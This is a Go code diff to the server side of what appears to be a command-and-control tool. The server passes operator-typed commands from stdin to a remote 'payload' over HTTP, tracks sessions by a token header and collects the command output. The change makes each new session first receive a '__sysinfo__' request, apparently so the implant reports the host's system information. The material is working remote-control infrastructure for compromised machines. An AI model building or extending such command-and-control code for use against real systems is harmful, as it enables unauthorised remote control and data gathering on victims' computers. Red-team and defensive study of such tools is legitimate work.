@@ -16,25 +16,34 @@ var Server *http.Server
 // cmd from stdin to send to the payload
 func GetCmd(w http.ResponseWriter, req *http.Request) {
 	if req.Method == http.MethodGet {
-		index := CreateSession(req.Header.Get("token"))
+		token := req.Header.Get("token")
+
+		index, isNew := CreateSession(token)
 
 		session := Sessions[index]
-		cli.Printf("[+] Got request for cmd from session id: %d\n", index)
-		var command string
 
-		for {
-			select {
-			case str := <-session.Cmd:
-				command = str
-				fmt.Println(command)
+		if isNew {
+			cli.Printf("[+] New connection with session id: %d\n", index)
+			// if the session is new, get the system information
+			fmt.Fprint(w, "__sysinfo__")
+		} else {
+			cli.Printf("[+] Got request for cmd from session id: %d\n", index)
+			var command string
+
+			for {
+				select {
+				case str := <-session.Cmd:
+					command = str
+					fmt.Println(command)
+				}
+				break
 			}
-			break
-		}
-		fmt.Fprintf(w, command)
+			fmt.Fprintf(w, command)
 
-		if command == "quit" {
-			Sessions[index].Open = false
-			cli.Printf("[+] Session %d quit.\n", index)
+			if command == "quit" {
+				Sessions[index].Open = false
+				cli.Printf("[+] Session %d quit.\n", index)
+			}
 		}
 	}
 }
@@ -44,6 +53,7 @@ func GetCmd(w http.ResponseWriter, req *http.Request) {
 func CmdOutput(w http.ResponseWriter, req *http.Request) {
 	if req.Method == http.MethodPost {
 		body, err := ioutil.ReadAll(req.Body)
+		defer req.Body.Close()
 		if err != nil {
 			cli.Printf("[-] Got error:\n%s\n", err)
 			return
